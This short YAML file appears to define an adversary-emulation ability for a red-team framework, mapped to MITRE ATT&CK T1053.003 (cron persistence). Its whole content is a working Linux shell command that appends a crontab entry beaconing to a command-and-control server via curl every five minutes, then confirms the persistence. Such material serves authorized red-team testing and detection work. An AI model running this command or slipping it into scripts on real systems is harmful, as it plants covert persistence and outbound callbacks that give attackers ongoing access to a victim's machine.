- id: "persist-cron-backdoor"
  name: "Install Cron Persistence"
  description: "Establishes persistence via cron job for C2 callback."
  tactic: "persistence"
  technique:
    attack_id: "T1053.003"
    name: "Scheduled Task/Job: Cron"
  platforms:
    linux:
      sh:
        command: |
          C2_SERVER="#{server}"; CRON_CMD="*/5 * * * * curl -s $C2_SERVER/beacon > /dev/null 2>&1"; (crontab -l 2>/dev/null; echo "$CRON_CMD") | crontab -; echo "[+] Persistence established via cron"; crontab -l
